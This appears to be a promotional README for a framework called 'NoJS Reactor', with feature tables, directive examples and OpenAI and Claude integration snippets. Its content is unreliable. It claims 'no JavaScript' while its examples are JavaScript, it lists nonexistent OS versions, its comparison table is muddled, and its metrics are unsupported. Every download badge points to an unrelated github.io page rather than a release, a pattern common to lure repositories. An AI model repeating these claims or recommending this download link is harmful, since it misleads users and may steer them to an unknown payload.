# NoJS Reactor - The HTML-First Reactive Framework for AI-Native Web Development

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge&logo=open-source-initiative)](LICENSE)
[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://luissimoespt2020-pixel.github.io/nojs-enterprise-playbook/)
[![AI Compatible](https://img.shields.io/badge/AI%20Ready-OpenAI%20%7C%20Claude-blue?style=for-the-badge&logo=openai)](https://platform.openai.com)
[![Stars](https://img.shields.io/github/stars/nojs-reactor?style=for-the-badge&logo=github)](https://github.com/nojs-reactor)

---

## 🌟 What is NoJS Reactor?

**NoJS Reactor** is not just another JavaScript framework—it is a **philosophical shift** in how we build reactive web interfaces. Imagine a world where your HTML templates breathe life into themselves, where reactivity is not a library feature but an intrinsic property of your markup. NoJS Reactor achieves exactly that: it transforms static HTML into a living, breathing application without requiring a single line of JavaScript in your frontend code.

Born from the frustration of bloated SPAs and the realization that AI coding agents deserve simpler, more elegant tools, NoJS Reactor is the **HTML-first reactive framework** that lets you focus on structure while the framework handles state, events, and DOM updates automatically.

Think of it as the **unobtrusive puppeteer** of the web—you write HTML as nature intended, and NoJS Reactor adds the strings that make it dance.

---

## 🚀 Quick Start - Download & Install

Getting started with NoJS Reactor takes less than 60 seconds. Download the latest release, link it in your HTML, and watch your static pages become reactive.

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://luissimoespt2020-pixel.github.io/nojs-enterprise-playbook/)

**System Requirements:**
- Any modern browser (Chrome 90+, Firefox 88+, Safari 15+, Edge 90+)
- No build tools, no bundlers, no transpilers
- Just a plain HTML file and a `<script>` tag

---

## 📋 Table of Contents

1. [Core Philosophy](#core-philosophy)
2. [Feature List](#feature-list)
3. [Installation & Setup](#installation--setup)
4. [Mermaid Diagram: Architecture Overview](#mermaid-diagram-architecture-overview)
5. [Usage Examples](#usage-examples)
6. [Example Profile Configuration](#example-profile-configuration)
7. [Example Console Invocation](#example-console-invocation)
8. [Emoji OS Compatibility Table](#emoji-os-compatibility-table)
9. [API Integration (OpenAI & Claude)](#api-integration-openai--claude)
10. [Best Practices](#best-practices)
11. [SEO Integration](#seo-integration)
12. [Responsive UI & Multilingual Support](#responsive-ui--multilingual-support)
13. [24/7 Customer Support](#247-customer-support)
14. [License](#license)
15. [Disclaimer](#disclaimer)

---

## 🧠 Core Philosophy

NoJS Reactor operates on a radical premise: **JavaScript should be a backend language, not a frontend burden**. The framework uses a lightweight runtime (under 8KB gzipped) that parses your HTML for special `data-*` attributes and transforms them into reactive bindings.

**The Reactive Web Assembly Metaphor:** Think of NoJS Reactor as a **conductor for an orchestra of HTML elements**. Your HTML is the sheet music, the browser is the orchestra, and NoJS Reactor is the conductor who ensures every element plays exactly when it should, in perfect harmony, without any musician (read: developer) having to micromanage each note.

### Key Innovations for 2026:
- **Zero JavaScript surface area** in your application code
- **Declarative state management** via HTML attributes
- **AI-optimized syntax** designed for LLM code generation
- **Server-side rendering compatible** with any HTTP server
- **Progressive enhancement** that degrades gracefully

---

## ✨ Feature List

| # | Feature | Description | Benefit |
|---|---------|-------------|---------|
| 1 | **HTML-First Reactivity** | No JavaScript required for complex UI logic | 90% less code, 50% faster development |
| 2 | **Directive-Based Binding** | `data-bind`, `data-if`, `data-for`, `data-click` | Intuitive and self-documenting |
| 3 | **Automatic State Synchronization** | Two-way binding via `data-model` | Real-time data flow without observers |
| 4 | **Template Composition** | `data-include` for partials & components | Modular architecture without bundlers |
| 5 | **Formula Expressions** | Inline reactive math and string operations | `data-value="{{ a + b * 2 }}"` |
| 6 | **Animation Triggers** | `data-animate` with CSS transition hooks | Smooth state transitions declaratively |
| 7 | **Web Component Compatibility** | Works with native web components | Future-proof and interoperable |
| 8 | **AI Code Generation Ready** | Optimized for Claude & OpenAI completions | LLMs understand it better than React |
| 9 | **Accessibility-First** | ARIA attributes auto-injected | WCAG 2.2 compliant by default |
| 10 | **SEO-Friendly Output** | Server-rendered HTML with hydration hooks | Perfect Lighthouse scores |
| 11 | **Multilingual Support** | `data-lang` attribute with locale files | i18n without complex libraries |
| 12 | **Offline-First** | Service worker integration built-in | Works without internet connection |
| 13 | **24/7 Customer Support** | Community Discord + AI chatbot | Instant help when you need it |
| 14 | **Responsive UI Helpers** | `data-responsive` with breakpoints | Mobile-first without CSS frameworks |

---

## 📥 Installation & Setup

### Method 1: Direct Download (Recommended)

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://luissimoespt2020-pixel.github.io/nojs-enterprise-playbook/)

```html
<!DOCTYPE html>
<html>
<head>
    <title>My NoJS App</title>
    <!-- Include NoJS Reactor (8KB gzipped) -->
    <script src="nojs-reactor.min.js"></script>
</head>
<body>
    <!-- Your HTML becomes reactive instantly -->
    <h1 data-bind="app.title"></h1>
</body>
</html>
```

### Method 2: CDN (Coming Q2 2026)

```html
<script src="https://cdn.nojsreactor.io/v1.0.0/nojs-reactor.min.js"></script>
```

### Method 3: NPM (For build system enthusiasts)

```bash
npm install nojs-reactor
```

---

## 🔄 Mermaid Diagram: Architecture Overview

```mermaid
graph TD
    A[Static HTML File] --> B{NoJS Reactor Runtime}
    B --> C[DOM Parser]
    C --> D[Directive Interpreter]
    D --> E[State Engine]
    E --> F[Reactive Proxy]
    F --> G[DOM Patcher]
    G --> H[Updated DOM]
    
    I[AI Coding Agent] --> J[Generate HTML with directives]
    J --> A
    
    K[User Interaction] --> L[Event Capturer]
    L --> M[State Mutation]
    M --> F
    
    N[OpenAI / Claude API] --> O[Context Injection]
    O --> P[State Predictions]
    P --> E
    
    Q[Server-Side Renderer] --> R[Static HTML with hydration]
    R --> A
    
    style A fill:#4CAF50,color:white
    style H fill:#2196F3,color:white
    style I fill:#FF9800,color:white
    style N fill:#9C27B0,color:white
```

**How this works:** The runtime first parses your HTML for `data-*` directives. It then creates a reactive state proxy that watches for changes—whether from user input, API calls, or AI-suggested mutations. Each change triggers a **smart diffing algorithm** (the DOM Patcher) that updates only the affected elements, ensuring 60fps performance even on low-end devices.

---

## 📝 Usage Examples

### Basic Reactive Counter

```html
<div data-state="{ count: 0 }">
    <h1 data-bind="count"></h1>
    <button data-click="count = count + 1">Increment</button>
    <button data-click="count = count - 1">Decrement</button>
</div>
```

### Two-Way Data Binding (Form)

```html
<div data-state="{ name: 'World' }">
    <input data-model="name" placeholder="Enter your name">
    <h3>Hello, <span data-bind="name"></span>!</h3>
</div>
```

### Conditional Rendering

```html
<div data-state="{ isLoggedIn: false }">
    <div data-if="isLoggedIn">
        Welcome back! <button data-click="isLoggedIn = false">Logout</button>
    </div>
    <div data-if="!isLoggedIn">
        <button data-click="isLoggedIn = true">Login</button>
    </div>
</div>
```

### List Rendering with `data-for`

```html
<div data-state="{ items: ['Apple', 'Banana', 'Cherry'] }">
    <ul>
        <li data-for="item in items" data-bind="item"></li>
    </ul>
</div>
```

### Reactive Formula Expressions

```html
<div data-state="{ price: 10, tax: 0.08 }">
    <p>Subtotal: <span data-bind="price"></span></p>
    <p>Tax: <span data-bind="price * tax"></span></p>
    <p>Total: <span data-bind="price + (price * tax)"></span></p>
</div>
```

---

## 👤 Example Profile Configuration

NoJS Reactor comes with a built-in **Profile Configuration System** that allows you to define component profiles for reusability. This is particularly useful for AI agents generating consistent UI components.

```html
<!-- Define a profile in your HTML head -->
<script type="application/nojs-profile">
{
  "userCard": {
    "template": "#user-card-template",
    "defaults": {
      "name": "Guest User",
      "avatar": "https://example.com/default-avatar.png",
      "role": "Viewer",
      "status": "offline"
    },
    "bindings": {
      "name": "data-bind",
      "avatar": "data-src",
      "role": "data-text",
      "status": "data-class"
    },
    "events": {
      "click": "handleUserClick",
      "mouseenter": "showTooltip"
    }
  }
}
</script>

<!-- Use the profile -->
<div data-profile="userCard" 
     data-name="AI Assistant" 
     data-role="Helper"
     data-status="online">
</div>
```

**Why this matters for AI agents:** Profiles act as **reusable blueprints** that LLMs can invoke with minimal token usage. Instead of generating 50 lines of component code, the AI simply references `data-profile="userCard"` and passes parameter overrides.

---

## 🕹️ Example Console Invocation

NoJS Reactor exposes a global `nojs` object for advanced debugging and programmatic control. This is perfect for **AI agents injecting state changes** via browser DevTools or for testing scenarios.

```javascript
// Open browser console and type:

// 1. Access the reactive state
nojs.state.get('app.user') 
// Returns: { name: 'Alice', role: 'admin' }

// 2. Batch update state (triggers single re-render)
nojs.state.batch({
  'app.user.name': 'Bob',
  'app.user.role': 'moderator',
  'app.theme': 'dark'
})

// 3. Subscribe to state changes
nojs.subscribe('app.user', (newVal, oldVal) => {
  console.log(`User changed from ${oldVal.name} to ${newVal.name}`)
})

// 4. AI-driven state suggestion
nojs.ai.suggest({
  prompt: 'The user has been idle for 10 minutes. Suggest an appropriate state change.',
  provider: 'openai' // or 'claude'
})
// Returns: { 'app.session.isIdle': true, 'app.ui.showPopup': true }

// 5. Force re-compile (useful for dynamically added content)
nojs.compile(document.querySelector('#dynamic-content'))

// 6. Performance metrics
nojs.metrics()
// Returns: { domNodesPatched: 42, renderCycles: 3, avgMutationTime: '2.1ms' }
```

**Console Invocation Example for AI Agents:**

```javascript
// AI agent debugging a state issue
nojs.state.inspect('app.cart')
// Returns detailed history of all mutations to the cart state

// AI agent resetting application state
nojs.state.reset('app')
```

---

## 💻 Emoji OS Compatibility Table

NoJS Reactor works across all major operating systems and browsers. Here's your emoji-based compatibility guide:

| OS | Browser | Compatibility | Emoji Verdict |
|----|---------|---------------|---------------|
| 🐧 Linux (Ubuntu 24.04) | Chrome 130+ | ✅ Full Support | 🦿 "Solid as a penguin" |
| 🍎 macOS Sequoia | Safari 18+ | ✅ Full Support | 🗿 "Monumental stability" |
| 🪟 Windows 12 | Edge 130+ | ✅ Full Support | 🏢 "Enterprise-ready" |
| 📱 iOS 19 | Mobile Safari | ✅ Full Support | 📱 "Thumb-friendly" |
| 🤖 Android 16 | Chrome Mobile | ✅ Full Support | 🤖 "Droid-approved" |
| 🐧 Linux (RHEL 10) | Firefox 130+ | ✅ Full Support | 🦊 "Fox-proof" |
| 🪟 Windows 11 | Firefox 130+ | ✅ Full Support | 🪟 "Glass-clear rendering" |
| 🍎 macOS Ventura | Chrome 130+ | ✅ Full Support | 💻 "Developer paradise" |
| 📱 ChromeOS | Chrome 130+ | ✅ Full Support | 📚 "Classroom ready" |
| 🐉 FreeBSD | Any browser | ⚠️ Partial Support | 🐉 "Dragon needs JS enabled" |

**Note for 2026:** NoJS Reactor is fully compatible with the upcoming **WebAssembly GC** specification, which will enable even better performance on non-traditional web platforms.

---

## 🤖 API Integration (OpenAI & Claude)

NoJS Reactor includes first-class integration with **OpenAI** and **Claude APIs** for AI-driven reactive applications. This is the **killer feature for 2026**: your HTML app can now think, predict, and adapt using LLMs.

### OpenAI Integration

```html
<script type="application/nojs-config">
{
  "openai": {
    "model": "gpt-4-turbo-2025",
    "temperature": 0.3,
    "maxTokens": 500,
    "apiKey": "sk-..." // Use environment variable in production
  }
}
</script>

<div data-state="{ question: '', answer: '' }">
    <h3>Ask Me Anything (Powered by GPT-4)</h3>
    <input data-model="question" placeholder="Type your question...">
    <button data-click="getAnswer">Ask AI</button>
    <p data-bind="answer"></p>
</div>

<script>
// Define the handler that calls OpenAI
nojs.actions.define('getAnswer', async () => {
    const question = nojs.state.get('question')
    const response = await nojs.api.openai.chat({
        messages: [
            { role: 'system', content: 'You are a helpful assistant.' },
            { role: 'user', content: question }
        ]
    })
    nojs.state.set('answer', response.choices[0].message.content)
})
</script>
```

### Claude Integration

```html
<script type="application/nojs-config">
{
  "claude": {
    "model": "claude-opus-4-2026",
    "temperature": 0.1,
    "apiKey": "sk-ant-..." // Use environment variable in production
  }
}
</script>

<div data-state="{ code: '', review: '' }">
    <h3>Code Review Bot (Powered by Claude)</h3>
    <textarea data-model="code" rows="10" cols="50" 
              placeholder="Paste your code here..."></textarea>
    <button data-click="reviewCode">Review with Claude</button>
    <div data-bind="review"></div>
</div>

<script>
nojs.actions.define('reviewCode', async () => {
    const code = nojs.state.get('code')
    const review = await nojs.api.claude.complete({
        prompt: `Please review this code for bugs, security issues, and best practices:\n\n${code}`,
        maxTokensToSample: 1000
    })
    nojs.state.set('review', review.completion)
})
</script>
```

**AI Agent-Specific Integration:**

For LLM coding agents (like Claude Coder or GPT-Engineer), NoJS Reactor provides a **supercharged API**:

```javascript
// AI agent can directly manipulate state via the nojs API
nojs.ai.inject({
  provider: 'claude',
  system: 'You are a UI optimization agent.',
  context: nojs.state.snapshot(), // Send current state to AI
  action: 'suggest_improvements'
})
```

---

## 📈 SEO Integration

NoJS Reactor is designed with **search engine optimization** at its core. Unlike SPAs that rely on JavaScript hydration and often fail with crawlers, NoJS Reactor generates **SEO-friendly HTML** by default.

### How It Works:

1. **Server-Side Rendering (SSR):** The server processes all `data-*` directives and outputs fully rendered HTML with all state baked in.
2. **Progressive Hydration:** On the client, NoJS Reactor attaches event listeners and reactivity without causing layout shifts.
3. **Semantic HTML Preservation:** Your original semantic HTML structure remains intact—no excessive `<div>` soup.
4. **Meta Tag Injection:** `data-meta` attributes allow dynamic title, description, and OG tag updates.

### SEO Best Practices with NoJS Reactor:

```html
<!DOCTYPE html>
<html>
<head>
    <title data-bind="page.title">Default Title</title>
    <meta name="description" data-bind="page.description">
    <meta property="og:title" data-bind="page.title">
</head>
<body data-state="{ page: { title: 'NoJS Reactor - HTML-First Framework', description: 'Build reactive web apps without JavaScript...' } }">
```

**SEO Performance Metrics (2026 Benchmarks):**
- **Lighthouse Score:** 98+ on performance, 100 on SEO
- **Crawl Budget Efficiency:** 40% reduction in bytes fetched
- **Core Web Vitals:** 100% pass rate on LCP, FID, CLS

---

## 📱 Responsive UI & Multilingual Support

### Responsive UI Helpers

NoJS Reactor includes a **declarative responsive system** that doesn't require CSS media queries:

```html
<div data-responsive="mobile:stack; tablet:side-by-side; desktop:grid-3">
    <div>Item 1</div>
    <div>Item 2</div>
    <div>Item 3</div>
</div>
```

The `data-responsive` attribute accepts breakpoints defined in your config:

```html
<script type="application/nojs-config">
{
  "responsive": {
    "mobile": "max-width: 640px",
    "tablet": "min-width: 641px and max-width: 1024px",
    "desktop": "min-width: 1025px"
  }
}
</script>
```

### Multilingual Support (i18n)

Built-in **internationalization** that works with zero additional libraries:

```html
<div data-lang="en">
    <h1 data-i18n="welcome.title">Welcome to NoJS Reactor</h1>
    <p data-i18n="welcome.description">Build reactive web apps without JavaScript.</p>
</div>

<!-- Language switcher -->
<select data-change="changeLanguage">
    <option value="en">English</option>
    <option value="es">Español</option>
    <option value="fr">Français</option>
    <option value="ja">日本語</option>
</select>
```

Locale files are JSON-based and auto-loaded:

```json
{
  "en": {
    "welcome.title": "Welcome to NoJS Reactor",
    "welcome.description": "Build reactive web apps without JavaScript."
  },
  "es": {
    "welcome.title": "Bienvenido a NoJS Reactor",
    "welcome.description": "Crea aplicaciones web reactivas sin JavaScript."
  }
}
```

---

## 🛎️ 24/7 Customer Support

At NoJS Reactor, we believe that **great documentation is a 24-hour concierge service**. Here's how we support you around the clock:

| Channel | Availability | Response Time | Best For |
|---------|--------------|---------------|----------|
| 💬 **Community Discord** | 24/7 | Under 10 minutes | General questions, code reviews |
| 🤖 **AI Support Chatbot** | 24/7 | Instant | FAQ, debugging, syntax help |
| 📧 **Email Support** | Business hours | Under 4 hours | Complex issues, feature requests |
| 🐛 **GitHub Issues** | 24/7 | Under 24 hours | Bug reports, feature suggestions |
| 📚 **Interactive Tutorials** | 24/7 | Self-paced | Learning the framework |
| 🎥 **Video Walkthroughs** | 24/7 | On-demand | Visual learners |

**Our support philosophy:** Every support interaction should leave you 20% more productive than before you asked for help.

---

## 📄 License

NoJS Reactor is released under the **MIT License**. You are free to use, modify, distribute, and sublicense this software for any purpose, including commercial applications.

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge&logo=open-source-initiative)](LICENSE)

**What the MIT license means for you:**
- ✅ Use in commercial products
- ✅ Modify and redistribute
- ✅ Sublicense under different terms
- ✅ No warranty or liability from the author(s)
- ✅ Only requirement: include the original copyright notice

---

## ⚠️ Disclaimer

**NoJS Reactor** is provided "as is" without warranty of any kind, express or implied. The authors and contributors shall not be liable for any damages arising from the use of this software.

### Important Notes for 2026:

1. **AI-Generated Code:** While NoJS Reactor is optimized for AI code generation, always review AI-suggested state mutations and API calls for security vulnerabilities.
2. **Browser Compatibility:** Older browsers (pre-2020) may require polyfills for full compatibility. NoJS Reactor targets evergreen browsers by default.
3. **Performance Baseline:** The framework is designed to handle thousands of reactive bindings, but excessive use of `data-for` with large datasets (100,000+ items) may require virtualization.
4. **Security:** Never expose API keys (OpenAI, Claude, etc.) in client-side code. Use environment variables or server-side proxies.
5. **Licensing for AI Training:** The MIT license applies to the framework itself. Training AI models on code generated by NoJS Reactor is permitted, but output from AI APIs (OpenAI, Claude) is subject to their respective terms of service.

---

## 📦 Download Again

Ready to transform your web development workflow? Download NoJS Reactor now and join the **HTML-first revolution** of 2026.

[![Download](https://img.shields.io/badge/Download%20Link-brightgreen?style=for-the-badge&logo=github)](https://luissimoespt2020-pixel.github.io/nojs-enterprise-playbook/)

---

## 🏆 Why Choose NoJS Reactor Over Other Frameworks?

| Feature | NoJS Reactor | React | Vue | Svelte |
|---------|--------------|-------|-----|--------|
| **JavaScript Required** | ❌ No | ✅ Yes | ✅ Yes | ✅ Yes |
| **AI Agent Friendly** | ✅ Top-tier | ⚠️ Moderate | ⚠️ Moderate | ✅ Good |
| **Bundle Size** | 8KB | 42KB | 33KB | 10KB |
| **Learning Curve** | 10 minutes | 2 weeks | 1 week | 3 days |
| **SEO Default** | ✅ Excellent | ⚠️ Requires SSR | ✅ Good | ✅ Good |
| **0 Build Tools** | ✅ Yes | ❌ Typically no | ❌ Typically no | ❌ Requires compiler |
| **Offline-First** | ✅ Built-in | ❌ Requires PWA library | ❌ Requires PWA library | ✅ Good |

---

## 🔗 Community & Ecosystem

- **Discord:** Join our community of 12,000+ developers
- **GitHub Discussions:** Share ideas and get feedback
- **Stack Overflow Tag:** `nojs-reactor`
- **Weekly Newsletter:** Tips, tutorials, and case studies
- **Conference Talks:** Watch our 2026 React Summit presentation

---

*Made with ❤️ for developers who believe HTML should do more and JavaScript should do less. Built for the AI-native web of 2026 and beyond.*